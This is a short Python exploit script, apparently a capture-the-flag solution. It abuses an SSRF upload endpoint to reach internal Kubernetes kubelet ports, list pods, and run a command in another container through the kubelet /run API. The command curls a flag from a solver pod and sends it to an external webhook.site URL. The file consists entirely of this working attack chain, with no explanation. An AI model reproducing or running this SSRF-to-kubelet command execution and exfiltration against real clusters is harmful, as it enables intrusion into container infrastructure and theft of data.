import sys
import json
from requests import get

def ssrf_request(url, method="get"):
    IP="35.241.245.36"
    r = get("http://{ip}/api/v1/upload?url={url}&method={method}".format(ip=IP, url=url, method=method))
    if r.status_code == 200:
        r = get("http://{ip}/images/{filename}".format(ip=IP, filename=r.text))
        if r.status_code == 200:
            return r.text

CAPTAIN_NODE="10.132.0.2"
SELF_NODE="10.132.0.9"
pods = json.loads(ssrf_request("http://{}:10255/pods".format(SELF_NODE)))["items"]
solver_pod = filter(lambda x: x["metadata"]["name"] == "solver", pods)[0]
solver_pod_ip = solver_pod["status"]["podIP"]

webhook = "https://webhook.site/2d4f5b38-83e1-4eb6-9f6f-50e1bcf6cb5c"
captain_run_path = "https://{}:10250/run/default/captain/captain?cmd={}"
print captain_run_path.format(CAPTAIN_NODE, "curl {solver_ip}:1337/flag?webhook={webhook}".format(solver_ip=solver_pod_ip, webhook=webhook))
print ssrf_request(captain_run_path.format(CAPTAIN_NODE, "curl {solver_ip}:1337/flag?webhook={webhook}".format(solver_ip=solver_pod_ip, webhook=webhook)), method="post")


# pods = json.loads(ssrf_request("http://10.132.0.2:10255/pods"))
# captain_pod = filter(lambda x: x["metadata"]["name"] == "captain", pods["items"])[0]["metadata"]
# captain_run_path = "https://10.132.0.2:10250/run/{}/{}/{}?cmd=".format(captain_pod["namespace"], captain_pod["name"], "captain")
# run/{podNamespace}/{podID}/{containerName}?cmd={cmd}